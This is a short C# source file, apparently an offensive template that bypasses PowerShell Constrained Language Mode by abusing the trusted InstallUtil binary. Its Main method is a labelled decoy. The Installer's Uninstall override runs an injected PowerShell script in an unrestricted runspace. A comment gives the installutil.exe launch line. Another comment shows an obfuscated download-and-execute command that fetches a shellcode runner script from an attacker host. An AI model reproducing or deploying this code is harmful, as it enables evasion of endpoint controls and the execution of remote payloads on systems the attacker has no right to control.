using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
namespace CLMBypass
{
	class Program
	{
		static void Main(string[] args)
		{
			Console.WriteLine("This is the main method which is a decoy");
		}	
	}

	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			String cmd = "";
			// example: cmd += "i`e`x(iWr -UsEbaSIcparSING http://192.168.45.243/shellcode_runner.ps1);";
            cmd += "{{code}}";
			Runspace rs = RunspaceFactory.CreateRunspace();
			rs.Open();

			PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;

			ps.AddScript(cmd);

			ps.Invoke();

			rs.Close();
		}
	}
}